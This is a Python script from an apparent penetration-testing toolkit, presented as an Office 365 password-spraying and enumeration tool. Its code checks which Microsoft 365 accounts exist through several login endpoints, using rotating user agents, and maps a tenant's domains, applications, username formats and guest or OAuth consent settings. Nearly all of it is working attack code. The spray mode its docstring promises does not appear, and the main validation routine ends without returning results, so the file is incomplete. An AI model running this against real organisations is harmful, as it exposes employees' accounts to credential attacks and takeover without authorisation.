#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================
"""
O365 Password Spraying and Enumeration Tool
Mimics o365spray functionality with enum, validate, and spray modes
"""

import requests
import argparse
import time
import random
import sys
import re
from typing import List, Tuple, Dict, Optional
from datetime import datetime
from pathlib import Path
import json
import getpass
import dns.resolver

class O365Enum:
    """Username enumeration via multiple O365 endpoints"""

    def __init__(self, domain: str, verbose: bool = False):
        self.domain = domain
        self.verbose = verbose
        self.session = requests.Session()
        self.valid_users = []
        self.invalid_users = []

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)

    def enum_office_api(self, email: str) -> Tuple[bool, str]:
        """
        Enumerate via Office.com GetCredentialType API
        Most reliable method - returns account existence
        """
        url = 'https://login.microsoftonline.com/common/GetCredentialType'

        headers = {
            'User-Agent': self._random_ua(),
            'Content-Type': 'application/json; charset=utf-8',
            'Accept': 'application/json'
        }

        data = {
            'Username': email,
            'IsOtherIdpSupported': True,
            'CheckPhones': False,
            'IsRemoteNGCSupported': True,
            'IsCookieBannerShown': False,
            'IsFidoSupported': True,
            'ForceotcLogin': False,
            'IsExternalFederationDisallowed': False,
            'IsRemoteConnectSupported': False,
            'FederationFlags': 0,
            'IsSignup': False,
            'FlowToken': None,
            'OriginalRequest': None
        }

        try:
            resp = self.session.post(url, headers=headers, json=data, timeout=30)

            if resp.status_code == 200:
                result = resp.json()

                # IfExistsResult: 0 = exists, 1 = doesn't exist, 5/6 = exists (other states)
                if_exists = result.get('IfExistsResult', 1)
                throttle_status = result.get('ThrottleStatus', 0)

                if throttle_status == 1:
                    return None, "THROTTLED"

                if if_exists == 0 or if_exists == 5 or if_exists == 6:
                    return True, "Valid account"
                else:
                    return False, "Invalid account"
            else:
                return None, f"HTTP {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enum_activesync(self, email: str) -> Tuple[bool, str]:
        """
        Enumerate via ActiveSync endpoint
        Fallback method when Office API is rate limited
        """
        url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'

        headers = {
            'User-Agent': self._random_ua(),
            'MS-ASProtocolVersion': '14.0'
        }

        try:
            resp = self.session.options(url, headers=headers, auth=(email, 'fake'), timeout=30)

            # 401 = valid user, 404 = invalid user
            if resp.status_code == 401:
                return True, "Valid (ActiveSync)"
            elif resp.status_code == 404:
                return False, "Invalid (ActiveSync)"
            else:
                return None, f"Unexpected response: {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enum_onedrive(self, username: str) -> Tuple[bool, str]:
        """
        Enumerate via OneDrive URL check
        Check if user's OneDrive exists
        """
        # Convert email to OneDrive format
        user_part = username.split('@')[0]
        domain_part = self.domain.replace('.', '_')
        onedrive_url = f'https://{domain_part}-my.sharepoint.com/personal/{user_part}_{domain_part}/_layouts/15/onedrive.aspx'

        headers = {
            'User-Agent': self._random_ua()
        }

        try:
            resp = self.session.get(onedrive_url, headers=headers, timeout=30, allow_redirects=False)

            # 302/401 = exists, 404 = doesn't exist
            if resp.status_code in [302, 401, 403]:
                return True, "Valid (OneDrive)"
            elif resp.status_code == 404:
                return False, "Invalid (OneDrive)"
            else:
                return None, f"Unexpected response: {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enumerate_users(self, usernames: List[str], method: str = 'office',
                       delay: int = 0, output_file: Optional[str] = None) -> Dict:
        """
        Enumerate list of usernames
        """
        self._log(f"Starting enumeration of {len(usernames)} users using {method} method")

        results = {
            'valid': [],
            'invalid': [],
            'unknown': []
        }

        for idx, username in enumerate(usernames, 1):
            # Construct full email if needed
            if '@' not in username:
                email = f"{username}@{self.domain}"
            else:
                email = username

            self._log(f"Testing {idx}/{len(usernames)}: {email}")

            # Choose enumeration method
            if method == 'office':
                valid, message = self.enum_office_api(email)
            elif method == 'activesync':
                valid, message = self.enum_activesync(email)
            elif method == 'onedrive':
                user_part = email.split('@')[0]
                valid, message = self.enum_onedrive(user_part)
            else:
                valid, message = self.enum_office_api(email)

            # Process result
            if valid is True:
                self._log(f"VALID: {email} - {message}", 'success')
                results['valid'].append(email)
                self.valid_users.append(email)
            elif valid is False:
                if self.verbose:
                    self._log(f"INVALID: {email} - {message}", 'error')
                results['invalid'].append(email)
                self.invalid_users.append(email)
            else:
                self._log(f"UNKNOWN: {email} - {message}", 'warning')
                results['unknown'].append(email)

            # Delay between requests
            if idx < len(usernames) and delay > 0:
                time.sleep(delay)

        # Save results
        if output_file:
            self._save_results(results, output_file)

        # Summary
        self._log(f"\n{'='*60}")
        self._log(f"Enumeration Complete", 'success')
        self._log(f"Valid: {len(results['valid'])}")
        self._log(f"Invalid: {len(results['invalid'])}")
        self._log(f"Unknown: {len(results['unknown'])}")
        self._log(f"{'='*60}\n")

        return results

    def _save_results(self, results: Dict, output_file: str):
        """Save enumeration results to file"""
        try:
            with open(output_file, 'w') as f:
                for email in results['valid']:
                    f.write(f"{email}\n")
            self._log(f"Valid users saved to: {output_file}", 'success')
        except Exception as e:
            self._log(f"Error saving results: {e}", 'error')

class O365DomainValidator:
    """Validate if a domain uses Office 365 and perform comprehensive tenant reconnaissance"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()
        self.tenant_id = None
        self.domain = None
        self.recon_data = {}

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)

    def check_mx_records(self, domain: str) -> Tuple[bool, List[str]]:
        """Check MX records for O365 indicators"""
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_hosts = [str(r.exchange).lower() for r in mx_records]

            # O365 MX record patterns
            o365_patterns = [
                '.mail.protection.outlook.com',
                '.onmicrosoft.com',
                'outlook.com'
            ]

            is_o365 = any(any(pattern in mx for pattern in o365_patterns) for mx in mx_hosts)
            return is_o365, mx_hosts

        except ImportError:
            self._log("MX check skipped - dnspython not installed", 'warning')
            return None, []
        except Exception as e:
            return False, []

    def check_autodiscover(self, domain: str) -> Tuple[bool, str]:
        """Check Autodiscover endpoint for O365"""
        url = f'https://autodiscover-s.outlook.com/autodiscover/autodiscover.json/v1.0/{domain}?Protocol=Autodiscoverv1'

        try:
            resp = self.session.get(url, timeout=10, allow_redirects=True)

            if resp.status_code == 200 or 'outlook' in resp.url.lower():
                return True, "Autodiscover points to O365"
            else:
                return False, f"Autodiscover HTTP {resp.status_code}"

        except Exception as e:
            return False, f"Autodiscover error: {str(e)}"

    def check_openid_config(self, domain: str) -> Tuple[bool, str, Optional[str]]:
        """Check OpenID configuration for tenant"""
        url = f'https://login.microsoftonline.com/{domain}/.well-known/openid-configuration'

        try:
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                data = resp.json()
                token_endpoint = data.get('token_endpoint', '')
                tenant_id = token_endpoint.split('/')[3] if token_endpoint else None

                # Store additional OpenID details
                self.recon_data['openid_config'] = {
                    'issuer': data.get('issuer'),
                    'authorization_endpoint': data.get('authorization_endpoint'),
                    'token_endpoint': data.get('token_endpoint'),
                    'userinfo_endpoint': data.get('userinfo_endpoint'),
                    'tenant_region_scope': data.get('tenant_region_scope'),
                    'cloud_instance_name': data.get('cloud_instance_name'),
                    'cloud_graph_host_name': data.get('cloud_graph_host_name')
                }

                return True, f"Valid O365 tenant (ID: {tenant_id})", tenant_id
            elif resp.status_code == 400:
                return False, "Domain not found in O365", None
            else:
                return False, f"HTTP {resp.status_code}", None

        except Exception as e:
            return False, f"OpenID check error: {str(e)}", None

    def check_federation(self, domain: str) -> Tuple[bool, str, Dict]:
        """Check domain federation/authentication method"""
        url = 'https://login.microsoftonline.com/common/userrealm/'

        params = {
            'user': f'user@{domain}',
            'api-version': '2.1',
            'checkForMicrosoftAccount': 'true'
        }

        try:
            resp = self.session.get(url, params=params, timeout=10)

            if resp.status_code == 200:
                data = resp.json()

                namespace_type = data.get('NameSpaceType')
                federation_brand = data.get('FederationBrandName', 'N/A')
                domain_name = data.get('DomainName', 'N/A')

                details = {
                    'namespace_type': namespace_type,
                    'federation_brand': federation_brand,
                    'domain_name': domain_name,
                    'cloud_instance': data.get('CloudInstanceName', 'N/A'),
                    'federation_protocol': data.get('FederationProtocol', 'N/A'),
                    'federation_metadata_url': data.get('FederationMetadataUrl', 'N/A')
                }

                if namespace_type == 'Managed':
                    return True, "Managed (Cloud-only authentication)", details
                elif namespace_type == 'Federated':
                    return True, f"Federated (SSO via {federation_brand})", details
                else:
                    return False, "Unknown namespace type", details
            else:
                return False, f"HTTP {resp.status_code}", {}

        except Exception as e:
            return False, f"Federation check error: {str(e)}", {}

    def get_tenant_details(self, tenant_id: str) -> Dict:
        """Get detailed tenant information using tenant ID"""
        self._log("Fetching tenant configuration details...")

        details = {}

        # Get OpenID configuration
        try:
            url = f"https://login.microsoftonline.com/{tenant_id}/v2.0/.well-known/openid-configuration"
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                data = resp.json()
                details['openid_v2'] = {
                    'tenant_region_scope': data.get('tenant_region_scope'),
                    'cloud_instance_name': data.get('cloud_instance_name'),
                    'cloud_graph_host_name': data.get('cloud_graph_host_name'),
                    'msgraph_host': data.get('msgraph_host'),
                    'rbac_url': data.get('rbac_url')
                }

                if self.verbose:
                    self._log(f"  Tenant Region: {data.get('tenant_region_scope')}")
                    self._log(f"  Cloud Instance: {data.get('cloud_instance_name')}")
                    self._log(f"  Graph Host: {data.get('cloud_graph_host_name')}")
        except Exception as e:
            if self.verbose:
                self._log(f"  Error getting OpenID v2 config: {e}", 'warning')

        # Try to get tenant branding info
        try:
            url = f"https://login.microsoftonline.com/{tenant_id}/v2.0/.well-known/openid-configuration"
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200:
                details['tenant_accessible'] = True
        except:
            details['tenant_accessible'] = False

        return details

    def enumerate_tenant_domains(self, tenant_id: str, primary_domain: str) -> List[str]:
        """Enumerate domains associated with the tenant"""
        self._log("Enumerating associated domains...")

        discovered_domains = [primary_domain]

        # Common domain variations to check
        base_name = primary_domain.split('.')[0]
        tld = primary_domain.split('.')[-1]

        variations = [
            f"{base_name}.onmicrosoft.com",
            f"{base_name}-my.sharepoint.com",
            f"{base_name}.sharepoint.com",
            f"{base_name}.mail.onmicrosoft.com",
        ]

        # Check for alternative TLDs
        common_tlds = ['com', 'net', 'org', 'io', 'co', 'us', 'uk', 'ca']
        for alt_tld in common_tlds:
            if alt_tld != tld:
                variations.append(f"{base_name}.{alt_tld}")

        # Check for common subdomain patterns
        subdomain_patterns = ['mail', 'webmail', 'remote', 'owa', 'autodiscover', 'lyncdiscover']
        for sub in subdomain_patterns:
            variations.append(f"{sub}.{primary_domain}")

        valid_domains = []

        for domain in variations:
            try:
                # Quick check using GetCredentialType
                url = 'https://login.microsoftonline.com/common/GetCredentialType'
                data = {'Username': f'test@{domain}'}
                resp = self.session.post(url, json=data, timeout=5)

                if resp.status_code == 200:
                    result = resp.json()
                    if result.get('IfExistsResult') in [0, 5, 6]:
                        valid_domains.append(domain)
                        if self.verbose:
                            self._log(f"  Found: {domain}", 'success')

                time.sleep(0.5)  # Rate limiting

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error checking {domain}: {e}", 'warning')

        if valid_domains:
            self._log(f"Discovered {len(valid_domains)} associated domains", 'success')

        return valid_domains

    def enumerate_applications(self, tenant_id: str) -> Dict:
        """Enumerate registered applications and service principals"""
        self._log("Enumerating registered applications...")

        # Well-known Microsoft application client IDs
        known_apps = {
            '1b730954-1685-4b74-9bfd-dac224a7b894': 'Azure Active Directory PowerShell',
            '1950a258-227b-4e31-a9cf-717495945fc2': 'Microsoft Azure PowerShell',
            '04b07795-8ddb-461a-bbee-02f9e1bf7b46': 'Microsoft Azure CLI',
            'd3590ed6-52b3-4102-aeff-aad2292ab01c': 'Microsoft Office',
            '00000002-0000-0ff1-ce00-000000000000': 'Office 365 Exchange Online',
            '00000003-0000-0000-c000-000000000000': 'Microsoft Graph',
            '00000002-0000-0000-c000-000000000000': 'Azure Active Directory Graph',
            '797f4846-ba00-4fd7-ba43-dac1f8f63013': 'Windows Azure Service Management API',
            '00000007-0000-0000-c000-000000000000': 'Dynamics CRM Online',
            '89bee1f7-5e6e-4d8a-9f3d-ecd601259da7': 'Office 365 Management APIs',
            'fc780465-2017-40d4-a0c5-307022471b92': 'Microsoft Teams Services',
            '5e3ce6c0-2b1f-4285-8d4b-75ee78787346': 'Microsoft Teams',
            'cc15fd57-2c6c-4117-a88c-83b1d56b4bbe': 'Microsoft Teams Web Client',
            '1fec8e78-bce4-4aaf-ab1b-5451cc387264': 'Microsoft Teams - Device Admin Agent',
        }

        accessible_apps = []

        for app_id, app_name in known_apps.items():
            try:
                # Try to initiate OAuth flow
                url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
                params = {
                    'client_id': app_id,
                    'response_type': 'code',
                    'redirect_uri': 'https://localhost',
                    'scope': 'openid',
                    'state': 'test'
                }

                resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

                # If we get a redirect to login, the app is accessible
                if resp.status_code in [200, 302]:
                    location = resp.headers.get('Location', '')
                    if 'login.microsoftonline.com' in location or resp.status_code == 200:
                        accessible_apps.append({
                            'client_id': app_id,
                            'name': app_name,
                            'accessible': True
                        })
                        if self.verbose:
                            self._log(f"  {app_name} ({app_id})", 'success')

                time.sleep(0.3)  # Rate limiting

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error checking {app_name}: {e}", 'warning')

        # Try to discover custom applications
        self._log("Checking for custom applications...")
        custom_apps = self._enumerate_custom_apps(tenant_id)

        results = {
            'known_apps': accessible_apps,
            'custom_apps': custom_apps,
            'total_accessible': len(accessible_apps) + len(custom_apps)
        }

        self._log(f"Found {results['total_accessible']} accessible applications", 'success')

        return results

    def _enumerate_custom_apps(self, tenant_id: str) -> List[Dict]:
        """Attempt to discover custom registered applications"""
        custom_apps = []

        # Common application naming patterns
        if self.domain:
            base_name = self.domain.split('.')[0]

            # Generate potential app names
            app_name_patterns = [
                base_name,
                f"{base_name}-app",
                f"{base_name}-api",
                f"{base_name}-web",
                f"{base_name}-mobile",
                f"{base_name}-portal",
                "app",
                "api",
                "web",
                "portal",
                "mobile"
            ]

            # Note: Without authentication, we can't directly enumerate custom apps
            # But we can check for common redirect URIs and endpoints

            for app_pattern in app_name_patterns[:3]:  # Limit to avoid too many requests
                # Check for common OAuth redirect patterns
                redirect_patterns = [
                    f"https://{app_pattern}.{self.domain}",
                    f"https://{app_pattern}.azurewebsites.net",
                    f"https://{self.domain}/{app_pattern}"
                ]

                for redirect_uri in redirect_patterns:
                    try:
                        # Quick HEAD request to see if endpoint exists
                        resp = self.session.head(redirect_uri, timeout=3, allow_redirects=True)
                        if resp.status_code in [200, 302, 401, 403]:
                            custom_apps.append({
                                'potential_redirect_uri': redirect_uri,
                                'status': 'exists',
                                'note': 'Potential OAuth redirect endpoint'
                            })
                            if self.verbose:
                                self._log(f"  Potential app endpoint: {redirect_uri}", 'info')
                    except:
                        pass

                    time.sleep(0.2)

        return custom_apps

    def discover_username_format(self, domain: str, test_names: List[Tuple[str, str]] = None) -> Dict:
        """Discover username format conventions"""
        self._log("Discovering username format patterns...")

        if not test_names:
            # Use common test names
            test_names = [
                ('John', 'Smith'),
                ('Jane', 'Doe'),
                ('Michael', 'Johnson'),
                ('Sarah', 'Williams')
            ]
            self._log("Using default test names for pattern discovery", 'info')

        patterns = {}

        for first, last in test_names:
            first_lower = first.lower()
            last_lower = last.lower()

            # Generate common patterns
            username_patterns = {
                'firstname.lastname': f"{first_lower}.{last_lower}",
                'firstnamelastname': f"{first_lower}{last_lower}",
                'flastname': f"{first_lower[0]}{last_lower}",
                'firstnamel': f"{first_lower}{last_lower[0]}",
                'lastname.firstname': f"{last_lower}.{first_lower}",
                'lastnamef': f"{last_lower}{first_lower[0]}",
                'firstname_lastname': f"{first_lower}_{last_lower}",
                'f.lastname': f"{first_lower[0]}.{last_lower}",
                'firstname': first_lower,
                'lastname': last_lower
            }

            for pattern_name, username in username_patterns.items():
                if pattern_name not in patterns:
                    patterns[pattern_name] = {'attempts': 0, 'exists': 0}

                patterns[pattern_name]['attempts'] += 1
                email = f"{username}@{domain}"

                try:
                    url = 'https://login.microsoftonline.com/common/GetCredentialType'
                    data = {'Username': email}
                    resp = self.session.post(url, json=data, timeout=5)

                    if resp.status_code == 200:
                        result = resp.json()
                        if result.get('IfExistsResult') == 0:
                            patterns[pattern_name]['exists'] += 1
                            if self.verbose:
                                self._log(f"  Found valid pattern: {pattern_name} ({email})", 'success')

                    time.sleep(0.3)  # Rate limiting

                except Exception as e:
                    if self.verbose:
                        self._log(f"  Error testing {email}: {e}", 'warning')

        # Calculate confidence scores
        likely_patterns = []
        for pattern_name, stats in patterns.items():
            if stats['exists'] > 0:
                confidence = (stats['exists'] / stats['attempts']) * 100
                likely_patterns.append({
                    'pattern': pattern_name,
                    'matches': stats['exists'],
                    'attempts': stats['attempts'],
                    'confidence': round(confidence, 2)
                })

        # Sort by confidence
        likely_patterns.sort(key=lambda x: x['confidence'], reverse=True)

        if likely_patterns:
            self._log(f"Identified {len(likely_patterns)} valid username patterns", 'success')
            for p in likely_patterns[:3]:  # Show top 3
                self._log(f"  {p['pattern']}: {p['confidence']}% confidence ({p['matches']}/{p['attempts']} matches)")
        else:
            self._log("No valid username patterns discovered with test names", 'warning')

        return {
            'patterns': likely_patterns,
            'test_names_used': len(test_names)
        }

    def check_guest_access(self, tenant_id: str, domain: str) -> Dict:
        """Check for guest user access and misconfigurations"""
        self._log("Checking guest access configuration...")

        results = {
            'guest_users_allowed': False,
            'external_domains_found': [],
            'oauth_misconfigurations': []
        }

        # Check if external/guest users can be validated
        external_test_domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com']

        for ext_domain in external_test_domains:
            test_email = f"test@{ext_domain}"

            try:
                url = 'https://login.microsoftonline.com/common/GetCredentialType'
                data = {'Username': test_email}
                resp = self.session.post(url, json=data, timeout=5)

                if resp.status_code == 200:
                    result = resp.json()
                    # Check if this external account could be a guest
                    if result.get('IfExistsResult') == 0:
                        results['external_domains_found'].append(ext_domain)
                        if self.verbose:
                            self._log(f"  External domain accessible: {ext_domain}", 'info')

                time.sleep(0.3)

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error checking {ext_domain}: {e}", 'warning')

        if results['external_domains_found']:
            results['guest_users_allowed'] = True
            self._log(f"Guest users may be enabled (found {len(results['external_domains_found'])} external domains)", 'warning')

        # Check for OAuth app consent misconfigurations
        self._log("Checking for OAuth consent misconfigurations...")

        # Test if user consent is allowed for apps
        try:
            # Try to initiate OAuth with a test app
            url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
            params = {
                'client_id': '00000003-0000-0000-c000-000000000000',  # Microsoft Graph
                'response_type': 'code',
                'redirect_uri': 'https://localhost',
                'scope': 'User.Read',
                'state': 'test'
            }

            resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

            # Analyze response for consent requirements
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'consent' in location.lower():
                    results['oauth_misconfigurations'].append({
                        'type': 'user_consent_allowed',
                        'description': 'Users may be able to consent to applications',
                        'risk': 'medium'
                    })
                    if self.verbose:
                        self._log("  User consent to apps may be enabled", 'warning')

        except Exception as e:
            if self.verbose:
                self._log(f"  Error checking OAuth consent: {e}", 'warning')

        # Check for admin consent requirements
        try:
            # Test with higher privilege scope
            url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
            params = {
                'client_id': '00000003-0000-0000-c000-000000000000',
                'response_type': 'code',
                'redirect_uri': 'https://localhost',
                'scope': 'Directory.Read.All',  # Requires admin consent
                'state': 'test'
            }

            resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

        except Exception as e:
            pass

        if results['oauth_misconfigurations']:
            self._log(f"Found {len(results['oauth_misconfigurations'])} potential OAuth misconfigurations", 'warning')

        return results

    def validate_domain(self, domain: str) -> Dict:
            """Comprehensive domain validation with full reconnaissance"""
            self.domain = domain
            self._log(f"Validating domain: {domain}")
            self._log("="*60)

            results = {
                'domain': domain,
                'is_o365': False,
                'tenant_id': None,
                'checks': {},
                'reconnaissance': {}
            }

            # Check 1: OpenID Configuration (gets tenant ID)
            self._log("Checking OpenID configuration...")
            openid_valid, openid_msg, tenant_id = self.check_openid_config(domain)
            results['checks']['openid'] = {
                'valid': openid_valid,
                'message': openid_msg
            }

            if openid_valid and tenant_id:
                self._log(f"OpenID Config: {openid_msg}", 'success')
                results['is_o365'] = True
                results['tenant_id'] = tenant_id
                self.tenant_id = tenant_id
            else:
                self._log(f"OpenID Config: {openid_msg}", 'error')

            # Check 2: Federation/Authentication Method
            self._log("Checking authentication method...")
            fed_valid, fed_msg, fed_details = self.check_federation(domain)
            results['checks']['federation'] = {
                'valid': fed_valid,
                'message': fed_msg,
                'details': fed_details
            }

            if fed_valid:
                self._log(f"Auth Method: {fed_msg}", 'success')
                results['is_o365'] = True

                if self.verbose and fed_details:
                    self._log(f"  Federation Brand: {fed_details.get('federation_brand')}")
                    self._log(f"  Cloud Instance: {fed_details.get('cloud_instance')}")
            else:
                self._log(f"Auth Method: {fed_msg}", 'error')

            # Check 3: MX Records
            self._log("Checking MX records...")
            try:
                mx_valid, mx_records = self.check_mx_records(domain)
                results['checks']['mx_records'] = {
                    'valid': mx_valid,
                    'records': mx_records
                }

                if mx_valid:
                    self._log(f"MX Records: Point to O365", 'success')
                    results['is_o365'] = True
                    if self.verbose:
                        for mx in mx_records:
                            self._log(f"  {mx}")
                else:
                    self._log(f"MX Records: Do not point to O365", 'warning')
                    if self.verbose and mx_records:
                        for mx in mx_records:
                            self._log(f"  {mx}")
            except Exception as e:
                self._log(f"MX Records: Error - {e}", 'warning')
                results['checks']['mx_records'] = {
                    'valid': None,
                    'message': str(e)
                }

            # Check 4: Autodiscover
            self._log("Checking Autodiscover endpoint...")
            autodiscover_valid, autodiscover_msg = self.check_autodiscover(domain)
            results['checks']['autodiscover'] = {
                'valid': autodiscover_valid,
                'message': autodiscover_msg
            }

            if autodiscover_valid:
                self._log(f"Autodiscover: {autodiscover_msg}", 'success')
                results['is_o365'] = True
            else:
                self._log(f"Autodiscover: {autodiscover_msg}", 'warning')

            # If we have a tenant ID, perform extended reconnaissance
            if self.tenant_id:
                self._log("\n" + "="*60)
                self._log("TENANT ID DISCOVERED - Beginning Extended Reconnaissance", 'success')
                self._log("="*60 + "\n")

                # 1. Tenant Details
                self._log("[1/5] Gathering tenant configuration...")
                try:
                    tenant_details = self.get_tenant_details(self.tenant_id)
                    results['reconnaissance']['tenant_details'] = tenant_details
                except Exception as e:
                    self._log(f"Error getting tenant details: {e}", 'error')
                    results['reconnaissance']['tenant_details'] = {'error': str(e)}

                # 2. Enumerate Domains
                self._log("\n[2/5] Enumerating associated domains...")
                try:
                    domains = self.enumerate_tenant_domains(self.tenant_id, domain)
                    results['reconnaissance']['associated_domains'] = domains
                except Exception as e:
                    self._log(f"Error enumerating domains: {e}", 'error')
                    results['reconnaissance']['associated_domains'] = {'error': str(e)}

                # 3. Enumerate Applications
                self._log("\n[3/5] Enumerating registered applications...")
                try:
                    apps = self.enumerate_applications(self.tenant_id)
                    results['reconnaissance']['applications'] = apps
                except Exception as e:
                    self._log(f"Error enumerating applications: {e}", 'error')
                    results['reconnaissance']['applications'] = {'error': str(e)}

                # 4. Username Format Discovery
                self._log("\n[4/5] Discovering username format patterns...")
                try:
                    username_patterns = self.discover_username_format(domain)
                    results['reconnaissance']['username_patterns'] = username_patterns
                except Exception as e:
                    self._log(f"Error discovering username patterns: {e}", 'error')
                    results['reconnaissance']['username_patterns'] = {'error': str(e)}

                # 5. Guest Access Check
                self._log("\n[5/5] Checking guest access and misconfigurations...")
                try:
                    guest_access = self.check_guest_access(self.tenant_id, domain)
                    results['reconnaissance']['guest_access'] = guest_access
                except Exception as e:
                    self._log(f"Error checking guest access: {e}", 'error')
                    results['reconnaissance']['guest_access'] = {'error': str(e)}

                # Print reconnaissance summary to console (even without verbose)
                print("\n" + "="*60)
                print("RECONNAISSANCE SUMMARY")
                print("="*60)

                # Applications
                if 'applications' in results['reconnaissance']:
                    apps = results['reconnaissance']['applications']
                    if isinstance(apps, dict) and apps.get('known_apps'):
                        print(f"\nAccessible Microsoft Applications ({len(apps['known_apps'])}):")
                        for app in apps['known_apps'][:10]:  # Show first 10
                            print(f"  - {app['name']}")
                        if len(apps['known_apps']) > 10:
                            print(f"  ... and {len(apps['known_apps']) - 10} more")

                    # Show custom apps if found
                    if apps.get('custom_apps'):
                        print(f"\nPotential Custom Application Endpoints ({len(apps['custom_apps'])}):")
                        for app in apps['custom_apps'][:5]:  # Show first 5
                            print(f"  - {app.get('potential_redirect_uri', 'Unknown')}")
                        if len(apps['custom_apps']) > 5:
                            print(f"  ... and {len(apps['custom_apps']) - 5} more")

                # Associated Domains
                if 'associated_domains' in results['reconnaissance']:
                    domains = results['reconnaissance']['associated_domains']
                    if isinstance(domains, list) and len(domains) > 1:  # More than just primary
                        print(f"\nAssociated Domains ({len(domains)}):")
                        for d in domains[:10]:
                            print(f"  - {d}")
                        if len(domains) > 10:
                            print(f"  ... and {len(domains) - 10} more")

                # Username Patterns
                if 'username_patterns' in results['reconnaissance']:
                    patterns_data = results['reconnaissance']['username_patterns']
                    if isinstance(patterns_data, dict):
                        patterns = patterns_data.get('patterns', [])
                        if patterns:
                            print(f"\nLikely Username Patterns:")
                            for p in patterns[:3]:  # Top 3
                                print(f"  - {p['pattern']}: {p['confidence']}% confidence")

                # Tenant Details Summary
                if 'tenant_details' in results['reconnaissance']:
                    tenant = results['reconnaissance']['tenant_details']
                    if isinstance(tenant, dict) and tenant.get('openid_v2'):
                        openid_info = tenant['openid_v2']
                        if openid_info.get('tenant_region_scope') or openid_info.get('cloud_instance_name'):
                            print(f"\nTenant Information:")
                            if openid_info.get('tenant_region_scope'):
                                print(f"  - Region: {openid_info['tenant_region_scope']}")
                            if openid_info.get('cloud_instance_name'):
                                print(f"  - Cloud: {openid_info['cloud_instance_name']}")

                # Guest Access
                if 'guest_access' in results['reconnaissance']:
                    guest = results['reconnaissance']['guest_access']
                    if isinstance(guest, dict):
                        warnings = []
                        if guest.get('guest_users_allowed'):
                            warnings.append("Guest users may be enabled")
                        if guest.get('oauth_misconfigurations'):
                            warnings.append(f"{len(guest['oauth_misconfigurations'])} OAuth misconfiguration(s) found")

                        if warnings:
                            print(f"\n⚠ Security Findings:")
                            for warning in warnings:
                                print(f"  - {warning}")

                print("\n" + "="*60)
